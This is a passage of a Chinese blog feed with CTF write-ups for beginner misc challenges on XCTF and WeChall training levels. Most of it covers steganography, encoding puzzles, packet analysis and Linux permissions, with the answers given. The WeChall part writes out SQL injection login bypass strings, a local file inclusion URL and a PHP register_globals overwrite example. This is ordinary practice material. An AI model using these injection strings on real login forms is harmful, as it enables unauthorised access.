        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界：misc题解(新手)</title>
      <link href="/2019/09/06/2019-gong-fang-shi-jie-misc-ti-jie/"/>
      <url>/2019/09/06/2019-gong-fang-shi-jie-misc-ti-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界：misc题解-新手"><a href="#攻防世界：misc题解-新手" class="headerlink" title="攻防世界：misc题解(新手)"></a>攻防世界：misc题解(新手)</h1><h2 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h2><p><code>Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}</code>  </p><ul><li><p>答案：flag{th1s_!s_a_d4m0_4la9}  </p></li><li><p>喂到嘴里的答案我就是吃不到，菜  </p></li></ul><h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p><code>今天是菜狗的生日，他收到了一个linux系统光盘</code>  </p><ul><li>下载文件  </li><li>查找flag关键字  </li><li>装载文件  </li><li>打开包含flag的文件，找到密文  </li><li>base64编码解密  </li><li><img src="https://ae01.alicdn.com/kf/H007c5173db724aca8fd6304ae901c2e07.jpg" alt>  </li></ul><h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p><code>菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包</code>  </p><ul><li>给我，你倒是给我啊，批个图批半天，恶心死我了，还好最后能扫了，为自己感动  </li><li>用ps抽帧，找到二维码  </li><li>用画图工具补全二维码  </li><li><img src="https://ae01.alicdn.com/kf/H62bdfa88adc243728a133b962404b89al.jpg" alt>  </li><li><img src="https://ae01.alicdn.com/kf/H2df00906cb744edbb4d542428d0e583d5.jpg" alt>  </li></ul><h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p><code>菜猫给了菜狗一张图，说图下面什么都没有</code>  </p><ul><li>下载图片，用比较高级一点的pdf编辑器，移除图片，出现flag  </li><li><img src="https://ae01.alicdn.com/kf/H4d53257d6d264c9083f884845f539d5dm.jpg" alt>  </li></ul><h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p><code>菜狗收到了图后很开心，玩起了pdf 提交格式为flag{xxx}</code>  </p><ul><li>下载了一个pdf，用谷歌浏览器打开，CTRL+A  -》 CTRL+C，粘贴到txt文件中  <ul><li><img src="https://ae01.alicdn.com/kf/H8656e219d64a4f1c8ca232fdb4cbbba4l.jpg" alt>  </li><li>有一串ab编码，看起来像摩尔斯点码  </li></ul></li><li>把A换成<code>.</code>,B换成<code>_</code>,得到一个串  <ul><li><img src="https://ae01.alicdn.com/kf/Hc01b76cda0a74a039eaafa49f6094f3fd.jpg" alt>  </li><li><code>-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- ..... ..... ....- --. ...--</code>  </li></ul></li><li>‘<a href="http://ctf.ssleye.com/morse.html&#39;" target="_blank" rel="noopener">http://ctf.ssleye.com/morse.html&#39;</a> 在这里进行解码的到 <code>congratulations,flag:1nv151bl3m3554g3</code>   <ul><li>答案 <code>flag{1nv151bl3m3554g3}</code>  </li></ul></li></ul><h2 id="SimpleRAR"><a href="#SimpleRAR" class="headerlink" title="SimpleRAR"></a>SimpleRAR</h2><p><code>菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层)</code>  </p><ul><li><p>解压缩文件报错  </p><ul><li><img src="https://ae01.alicdn.com/kf/H142016aa71b44b65a4202449b92393a00.jpg" alt>  </li></ul></li><li><p>ue打开  </p><ul><li><img src="https://ae01.alicdn.com/kf/Ha04a9012b1e94f3ab729299858fa3a5fw.jpg" alt>  </li><li>rar对png的文件类型编码是74，就在flag.txt文件结束，原来是7A，改成了74.  </li></ul></li><li><p>再解压的到了一整啥都没有的图片emmmmm，有问题  </p></li><li><p>ps打开  </p><ul><li>尼玛，不是png格式的打不开，那只能用ue打开看看了  </li><li><img src="https://ae01.alicdn.com/kf/H450c64ff57b74e42be3396e326c13115Y.jpg" alt>  </li><li>原来是gif，玩我，很好，改后缀.gif, 提取每一帧的图片，用stegsolve打开看看，发现半截二维码，他的另一半应该在另一半图片里（艹，我的呢，哭了）  <ul><li><img src="https://ae01.alicdn.com/kf/H45bfb65cf6564b3094f8f46f859948cbP.jpg" alt>  </li><li>另一半<img src="https://ae01.alicdn.com/kf/Hd42dd24a44544db5955a6ddcdb3e1fd7w.jpg" alt>  </li></ul></li></ul></li><li><p>又要批图了，giao  </p><ul><li><img src="https://ae01.alicdn.com/kf/H07323c83cf71454392dd593026b2bc4fN.jpg" alt>  </li></ul></li><li><p>扫描出结果  </p><ul><li><img src="https://ae01.alicdn.com/kf/H7aebd361b15b4797b6bd7d7dab484cd9r.jpg" alt>  </li><li>答案：<code>flag{yanji4n_bu_we1shi}</code>  </li></ul></li></ul><h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p><code>菜狗发现最近菜猫不爱理他，反而迷上了菜鸡</code>  </p><ul><li>下载了一个jar包，打开看一看，出题人又玩我，行，你nb  <ul><li><img src="https://ae01.alicdn.com/kf/Hea0764505fcf4b389aa9cd2724d45a25f.jpg" alt>  </li></ul></li><li>反编译jar包，找到了一个flag  <ul><li></li></ul></li></ul><p><img src="https://ae01.alicdn.com/kf/H74045ebb56114cd6a92287e085d656b32.jpg" alt>  </p><ul><li>开心的填了上去，不对，giao，又进行了加密，base64解密得到答案  <ul><li><code>flag{DajiDali_JinwanChiji}</code>  </li></ul></li></ul><h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p><code>菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机</code>  </p><ul><li>下载了一个压缩包，解压后发现了一个文件夹，里面又很多图片，哦一黑一白，真像01编码啊，原来是二进制啊，白色代表0黑色代表1，写出来  </li><li><img src="https://ae01.alicdn.com/kf/H820513c9a7c74eda9513b47eb7c447956.jpg" alt>  <ul><li>得到答案<code>flag{FuN_giF}</code>  </li></ul></li></ul><h2 id="掀桌子"><a href="#掀桌子" class="headerlink" title="掀桌子"></a>掀桌子</h2><p><code>菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻</code>  </p><ul><li>获取了一个字符串，一看只有0-9，a-f, 啊刚好是16进制啊，尝试各种解码失败，什么base16都整上了，蠢。  </li><li>16进制转成整数吧，两个一组发现最大的数250， 最小的160，而ascii的可显示字符从32开始，ascii的最大为128，猜想减去128，刚好最小的到32，试一试，成了  </li><li><img src="https://ae01.alicdn.com/kf/H40795c0337f041e98ea411243cec3d5cz.jpg" alt>  <ul><li>答案：<code>flag{hjzcydjzbjdcjkzkcugisdchjyjsbdfr}</code>  </li></ul></li></ul><h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p><code>菜狗为了打败菜猫，学了一套如来十三掌。</code>  </p><ul><li>下载了一个word文件，打开看到了一堆看不懂的‘汉字’，不止所措，看起来像佛语（当然我看不出来）  </li><li>找到了一个网站<code>http://www.keyfc.net/bbs/tools/tudoucode.aspx</code>,填入佛语，得到一个字符串  <ul><li><code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code>  </li></ul></li><li>十三掌，，rot13加密。。。emmmm这谁想得到啊  <ul><li>解密得到<code>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</code>  </li></ul></li><li>还是看不懂，base64解密得到<code>flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</code>  </li><li>这谁想得到啊，啊啊啊啊啊啊啊啊啊啊啊啊啊，又搞了两个小时  </li></ul><h2 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h2><p><code>菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓</code>  </p><ul><li><p>下载了一个文件，解压后发现需要密码，winrar修复了一下发现居然能打开了。记住这个套路了。  </p></li><li><p>解压打开后得到一个txt文件  </p><ul><li><img src="https://ae01.alicdn.com/kf/H19b0140e80fb4b5787f1b942e2b6520cy.jpg" alt>  </li><li>明显的base64加密，在线解密后发现是一个介绍base64隐写的字符串  </li></ul></li><li><p>啊啊啊啊啊啊啊，恶心的隐写，花了快2个小时才搞懂是啥，又花了两个小时敲代码，我佛了，代码献上  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"G://桌面//stego.txt"</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>      a <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>  s_d <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> each <span class="token keyword">in</span> a<span class="token punctuation">:</span>      <span class="token keyword">if</span> each<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'=='</span><span class="token punctuation">:</span>          each <span class="token operator">=</span> each<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>          m <span class="token operator">=</span> b64_mapping<span class="token punctuation">[</span>each<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>          mid <span class="token operator">=</span> <span class="token string">'{0:06b}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>m<span class="token punctuation">)</span>          s_d<span class="token punctuation">.</span>append<span class="token punctuation">(</span>mid<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">elif</span> each<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>          each <span class="token operator">=</span> each<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          m <span class="token operator">=</span> b64_mapping<span class="token punctuation">[</span>each<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>          mid <span class="token operator">=</span> <span class="token string">'{0:06b}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>m<span class="token punctuation">)</span>          s_d<span class="token punctuation">.</span>append<span class="token punctuation">(</span>mid<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  s <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>s_d<span class="token punctuation">)</span>  answer <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>answer<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>答案<code>flag{Base_sixty_four_point_five}</code>  </li></ul></li><li><p>总结：付出总会有收获的对吧^_^,加油啊  </p></li></ul><h2 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h2><ul><li>下载一个文件，一看格式不知道是啥，用foremost分离得到一个压缩包  <ul><li>安利这个博主写的foremost使用教程，贼好用<code>https://www.cnblogs.com/cnnnnnn/p/8994362.html</code>  </li></ul></li><li>压缩包里面有一个<strong>flag.txt</strong>文件还需要密码，那就要找密码喽  <ul><li>用wireshark分析流量包，是打开原始文件，分组字节流查找flag，找到了一个名为6666.jpg的文件流  <ul><li><img src="https://ae01.alicdn.com/kf/He1a66d285e464723a044f5e50879a4a7R.jpg" alt>  </li></ul></li><li>追踪该TCP流，jpg以FFD8开始，以最后一个FFD9结尾，  <ul><li><img src="https://ae01.alicdn.com/kf/Hc4abb24097274db0b50c86a6c4dd5cfaH.jpg" alt>  </li></ul></li><li>还要获取到该图片，复制中间的字符串，粘贴到winhex中，注意粘贴时选择ASCII Hex格式，保存为.jpg。  <ul><li><img src="https://ae01.alicdn.com/kf/H6e410f904ffb4585ae78d1258a1a369fn.jpg" alt>  </li></ul></li><li>最后的到的图片，密码<code>Th1s_1s_p4sswd_!!!</code><img src="https://ae01.alicdn.com/kf/H930292aa07cb425d881e43c78d90b204K.jpg" alt>  </li></ul></li><li>压缩包输入密码，得到<code>flag.txt</code>中的答案<code>flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}</code>  </li><li>两个小时不多不少，哎有收获就行，加油呀，路还很长^_^。  </li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 竞赛 </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WeChall 刷题</title>
      <link href="/2019/08/22/2019-wechall-lian-xi/"/>
      <url>/2019/08/22/2019-wechall-lian-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="WeChall-入门练习"><a href="#WeChall-入门练习" class="headerlink" title="WeChall 入门练习"></a>WeChall 入门练习</h1><p><a href="https://www.wechall.net/challs/by/chall_dif/DESC/page-1" target="_blank" rel="noopener">题目链接</a></p><h2 id="Get-Sourced"><a href="#Get-Sourced" class="headerlink" title="Get Sourced"></a>Get Sourced</h2><ul><li>检查网页源代码，滑到最下面得到答案<ul><li><img src="https://ae01.alicdn.com/kf/H03f4db398bda4476aadb881780e46af4U.jpg" alt></li><li><code>html_sourcecode</code></li></ul></li></ul><h2 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h2><ul><li>给了ASCII的整数子，将其转换为对应的字符即可<ul><li><img src="https://ae01.alicdn.com/kf/H76d2b7414deb4b7ca0786758dc02f7e4b.jpg" alt></li></ul></li></ul><h2 id="Encodings-URL"><a href="#Encodings-URL" class="headerlink" title="Encodings: URL"></a>Encodings: URL</h2><ul><li>得到一个url编码的字符串，将其转换为Unicode编码的到一个url<ul><li><img src="https://ae01.alicdn.com/kf/Ha13364f6b98e46c2b4d741a56adaa6dcr.jpg" alt></li></ul></li><li>这道题不用提交答案，只需在登录状态下访问获取到的url即可，前面加上<code>https://www.wechall.net/</code></li></ul><h2 id="Stegano-I"><a href="#Stegano-I" class="headerlink" title="Stegano I"></a>Stegano I</h2><ul><li>下载了一张图片，用ue打开，使用16进制模式查看得到答案<code>steganoI</code></li></ul><h2 id="WWW-Robots"><a href="#WWW-Robots" class="headerlink" title="WWW-Robots"></a>WWW-Robots</h2><ul><li>介绍了robots协议，访问<code>https://www.wechall.net/robots.txt</code>的到一个链接，</li><li>访问这个链接<a href="https://www.wechall.net//challenge/training/www/robots/T0PS3CR3T/" target="_blank" rel="noopener">https://www.wechall.net//challenge/training/www/robots/T0PS3CR3T/</a>，直接完成本题。</li></ul><h2 id="Crypto-Caesar-I"><a href="#Crypto-Caesar-I" class="headerlink" title="Crypto - Caesar I"></a>Crypto - Caesar I</h2><ul><li><p>考察凯撒密码，没给key，那就暴力破解，写个demo</p></li><li><p><img src="https://ae01.alicdn.com/kf/He4ac6aff37d94e039cfcc8d9af42befaL.jpg" alt></p></li><li><p>答案不分大小写：<code>dopghdbpdfsl</code></p></li></ul><h2 id="PHP-0817"><a href="#PHP-0817" class="headerlink" title="PHP 0817"></a>PHP 0817</h2><ul><li>考察本地文件包含漏洞</li><li>构造<code>index.php?which=solution</code>即可，即访问<a href="http://www.wechall.net/challenge/php0817/index.php?which=solution" target="_blank" rel="noopener">http://www.wechall.net/challenge/php0817/index.php?which=solution</a></li><li>看了<a href="https://github.com/p1o2p3u1/WeChall/blob/master/Training/PHP0817.md" target="_blank" rel="noopener">大佬的题解</a>还是有点不明白，应该先了解一下php了.</li></ul><h2 id="Prime-Factory"><a href="#Prime-Factory" class="headerlink" title="Prime Factory"></a>Prime Factory</h2><ul><li>感脚这道题不是考网安的啊，emmmmmm</li><li>写程序，求大于100万的素数且各数字之和也是素数的数<ul><li><img src="https://ae01.alicdn.com/kf/H46576a1064ac41a4a72394026efea1e5u.jpg" alt></li><li>答案<code>10000331000037</code></li></ul></li></ul><h2 id="MySQL-I"><a href="#MySQL-I" class="headerlink" title="MySQL I"></a>MySQL I</h2><ul><li>一道简单的考察sql注入的题，答案不唯一，关键点在于<ul><li><img src="https://ae01.alicdn.com/kf/H78e409df1f2341ef941220f418a45a3aX.jpg" alt></li><li>对于用户的输入没有任何的检测</li></ul></li><li><a href="https://blog.csdn.net/github_36032947/article/details/78442189" target="_blank" rel="noopener">https://blog.csdn.net/github_36032947/article/details/78442189</a> 这篇博客讲的挺清楚的，可以看看</li><li>答案不唯一<ul><li><code>Username:admin&#39;#</code> <code>Password:123</code></li><li><code>Username:admin&#39; or &#39;1&#39;=&#39;1</code> <code>Password:123</code></li></ul></li></ul><h2 id="Zebra"><a href="#Zebra" class="headerlink" title="Zebra"></a>Zebra</h2><ul><li><p>一张斑马的图片，这不就是条形码码，ps打开，将图形的部分移动使条纹可以用一条直线穿过</p><p><img src="https://ae01.alicdn.com/kf/Hdcd1c43d1f0244aeac7f4332b4529fd5z.png" alt></p></li><li><p>截取最长的部分</p><p><img src="https://ae01.alicdn.com/kf/H869e403c41384120a5d81a55fe26583fG.png" alt></p></li><li><p>随便找一个条形码识别网站<a href="https://demo.dynamsoft.com/DBR/BarcodeReaderDemo.aspx" target="_blank" rel="noopener">比如这个</a>，整进去的到答案<code>saFFari</code><img src="https://ae01.alicdn.com/kf/Hee94e5522bdd4b328fd1461067251617Y.jpg" alt></p></li></ul><h2 id="Stegano-Attachment"><a href="#Stegano-Attachment" class="headerlink" title="Stegano Attachment"></a>Stegano Attachment</h2><ul><li><p>下载了一张以php结尾的图片，直接将后缀改为png，用Stegsolve，试了一遍也没有看出来什么。</p></li><li><p>直接用<code>winhex</code>打开，拖到最后<img src="https://ae01.alicdn.com/kf/H1c7e07ac51f14dafaa7f21ab581c20e3D.jpg" alt></p><p>发现了里面有一个名为solution的文件，初步判断应该是有一个压缩包附在了图片的后面，zip文件的文件头标识是：<code>504B0304</code>，jpeg文件的标识头是<code>FFD8FF</code>，结尾标识是<code>FFD9</code></p><p><img src="https://ae01.alicdn.com/kf/H54a07ba3b8cb4a16b94f1f48439a356eG.jpg" alt></p></li><li><p>将从<code>504B0304</code>到最后的选中右键编辑复制选快到新文件并保存为<code>.zip</code>的文件，解压打开得到solution.txt, 里面就有答案<code>RLGIGOGSOICB</code></p></li><li><p>duang ,duang  duang …………..看到有位博主说不用另存文件，直接将源文件用winrar打开，可以直接得到解压后的结果，emmmmm, giao</p></li></ul><h2 id="Crypto-Transposition-I"><a href="#Crypto-Transposition-I" class="headerlink" title="Crypto - Transposition I"></a>Crypto - Transposition I</h2><ul><li><p>终于有道题可以让我说出 so easy,hahahaha。<code>oWdnreuf</code>, 这不就是<code>wonderful</code> 吗，没错就是每两个字母调换位置，把他们换回来就行了</p></li><li><p>代码</p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token string">"oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt  oes eoyrup sawsro don:wa fpsolmgfdd.o"</span>a <span class="token operator">=</span> list<span class="token punctuation">(</span>a<span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>    s <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Wonderful. You can read the message way better when the letters are in correct order. I think you would like to see your password now: apfosmlfgddo.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>答案 <code>apfosmlfgddo</code></p></li></ul><h2 id="hi-Math"><a href="#hi-Math" class="headerlink" title="hi(Math)"></a>hi(Math)</h2><ul><li>就是一个等差数列, a1 = 2, a2 = 3, a3 = 4 ，a_n = n + 1, s_n = (a_n + 2) * n / 2;</li><li>题中的n的值为<code>17591026060781</code></li><li>使用win10自带的编辑器,的出答案 <code>154722098935564539692256152‬</code></li></ul><h2 id="Warchall-The-Beginning"><a href="#Warchall-The-Beginning" class="headerlink" title="Warchall - The Beginning"></a>Warchall - The Beginning</h2><ul><li><p>根据题意应该是链接linux服务器，从服务器获取答案。输入链接服务器的密码的到的到链接服务器的信息<code>ssh -p 19198 asdfak@warchall.net</code></p></li><li><p>链接服务器，输入我们设置的密码。查看当前目录的文件，</p><p>level 文件夹， WELCOME.txt 的文件</p></li><li><p>WELCOME.txt</p><p>说了一大堆欢迎的话，告诉我们应该去 <code>/home/level</code> 或者 <code>/home/user/yournick/level</code> ，后者实际上就是我们自己的用户目录，即<code>~/level</code>。浏览文件夹，发现1，2，3在第一个文件夹，4，5在后一个文件夹。</p><p><img src="https://ae01.alicdn.com/kf/Hadd08d4ab01e4badbc90a0381964a95bf.jpg" alt></p><p><img src="https://ae01.alicdn.com/kf/H38109462fe874abe8fec53616ee55ef9o.jpg" alt></p></li><li><p>level0</p><p>查看0文件夹下的文件，<code>README.txt</code>格外显眼，打开的到level0：<code>bitwarrior</code>,  此处应该注意的是，文件告诉你答案的格式 </p><p><img src="https://ae01.alicdn.com/kf/H08ffb05ebba24fb584c08ca319fba5d3D.jpg" alt></p><p>solution 就是文件告诉你flag的关键词，很重要。</p></li><li><p>level1</p><p>查看<code>/home/level/1</code>文件夹下的文件，有文件夹有文件，一个一个打开太慢了，使用<code>grep -rn solution</code> 递归地寻找当前目录下的所有文件名或者内容中出现solution的情况（隐藏文件/文件夹也会查找）</p><p><img src="https://ae01.alicdn.com/kf/H6f1fe862458d4d9ea866bfdf7aae7f6dL.jpg" alt></p></li><li><p>level2 </p><p>还是查看<code>/home/level/2</code>下的文件，不过这次要答案在隐藏文件里，使用 <code>ls -a</code> 可以查看所有文件。还是使用<code>grep -rn solution</code> </p><p>找到solution：flag 在 隐藏文件夹<code>/home/level/2/.porb/</code>的隐藏文件<code>.solution</code>里面</p><p><img src="https://ae01.alicdn.com/kf/Hbd350a01be5445f590b50e9ee60cbaaeh.jpg" alt></p></li><li><p>level3</p><p>老办法，没啥难度，找到flag 在 <code>/home/level/3</code> 下的隐藏文件<code>.bash_history</code>里面</p><p><img src="https://ae01.alicdn.com/kf/Ha6393112a9094e72a11e93e7608df789b.jpg" alt></p></li><li><p>level4</p><p>回到自己的用户目录下的level文件夹<code>cd ~/level</code>。进入<code>~/level</code>下的0文件夹，查看其下的文件。有个<code>README.txt</code>文件，<code>cat README.txt</code>打开文件，显示没有权限。</p><p><img src="https://ae01.alicdn.com/kf/Hab66b901605c43898181f9fb2a531845g.jpg" alt></p><p>我没有权限，谁有权限，查看<code>ls -l</code>文件权限列表</p><p><img src="https://ae01.alicdn.com/kf/H9498e2c0ab4c4c2bb4535d26d28b4264c.jpg" alt></p><p>这不就是我的文件吗，只是没有开启可读权限，打开权限<code>chmod 700 README.txt</code> , 然后查看文件<code>cat  README.txt</code>。得到</p><p><img src="https://ae01.alicdn.com/kf/Hfdf6da876bdb429e90ab0bc3f7c33e4fF.jpg" alt></p></li><li><p><a href="https://blog.csdn.net/nzing/article/details/9166057" target="_blank" rel="noopener">Linux 文件权限指令</a></p></li><li><p>level5 </p><p>进入文件夹<code>~/level/5</code> 查看文件<code>cat README.txt</code> , 发现</p><p><img src="https://ae01.alicdn.com/kf/H99f8fc624731445db2485d191db679ef5.jpg" alt></p><p>让我们保护这个文件夹，那就清除别的用户的权限，先查看这个文件夹的权限，回到主目录<code>~</code>, <code>ls -l</code> 查看权限</p><pre><code>drwx---r-x 5 asdfak asdfak 4096 Sep 14 09:59 level</code></pre><p>清除别的用户的权限相当于，将让其可以为我们所使用。执行<code>chmod 700 level</code>, 答案在不经意之间出现在了，在<code>~/level/5</code>文件夹下出现了一个<code>solution.txt</code>的文件，获取读取权限，然后查看文件</p><p><img src="https://ae01.alicdn.com/kf/Hfcf5f81325d9423598412a81bbad8810C.jpg" alt></p></li><li><p>最后答案 <code>bitwarrior,LameStartup,HiddenIsConfig,RepeatingHistory,AndIknowchown,OhRightThePerms</code></p></li><li><p>wp 写的过程还是比较艰辛，比较负载，小白有点心累。加油呀o(<em>^▽^</em>)┛。</p></li></ul><h2 id="Register-Globals"><a href="#Register-Globals" class="headerlink" title="Register Globals"></a>Register Globals</h2><p>这道题我是一直想通过post的方式对全局变量进行修改，从而忽略了php代码的执行顺序，由于么个判断时独立的，而获取答案的判断条件与前面的post获取变量的条件是不相关的。</p><h3 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h3><blockquote><p>要利用<a href="https://www.php.net/manual/zh/security.globals.php" target="_blank" rel="noopener">Register Global</a>的漏洞</p></blockquote><ul><li><p>漏洞的大致内容如下：</p><p>由于php变量不用初始化的问题并且设置了register_global=ON的情况下，导致php中的变量可以直接通过页面的表单，cookie等进入程序中。</p></li><li><p>实例</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">echo</span> <span class="token string">"Register_globals: "</span><span class="token punctuation">.</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">"register_globals"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auth</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">"private!"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token delimiter">?></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当Register Global为OFF时代码不会出现问题，但当register_golbal=ON时，提交请求URL<code>xxx.php?auth=1</code> 的结果为：</p><p>Register_globals: 1</p><p>private!;</p><p>但如果上述程序中已经设置了auth=0，那么即使url中包含auth=1，也不会出现变量的覆盖，即不会大衣橱private；</p><hr><p>通过$GLOBALS获取的变量，也可能导致变量覆盖</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">echo</span> <span class="token string">"Register_globals:"</span><span class="token punctuation">.</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">"register_globals"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'register_globals'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token function">unset</span><span class="token punctuation">(</span>$<span class="token punctuation">{</span><span class="token variable">$k</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">print</span> <span class="token variable">$a</span><span class="token punctuation">;</span>  <span class="token keyword">print</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token delimiter">?></span>  <span aria-hidden="true" 